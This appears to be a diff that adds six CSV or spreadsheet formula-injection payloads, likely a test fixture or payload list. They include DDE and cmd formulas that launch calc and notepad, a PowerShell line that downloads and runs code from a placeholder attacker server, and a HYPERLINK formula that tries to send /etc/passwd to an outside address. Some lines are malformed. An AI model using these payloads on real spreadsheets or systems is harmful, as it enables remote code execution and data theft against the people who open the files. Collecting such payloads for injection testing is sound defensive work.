@@ -1,0 +1,6 @@
+DDE ("cmd"" calc";"!A")A0,first
+SUM()*cmd|'  calc'!A,second
+0+cmd|'  calc'!A0,third
+cmd|'  notepad'!'A',fourth
+cmd|' powershell IEX(wget attacker_servershell)'!A,fifth
+HYPERLINK(CONCATENATE("http:/.0.0.0:0/.txt?v=" ('file:///etc/passwd'#$passwd.A1)); "testpoc"),sixth
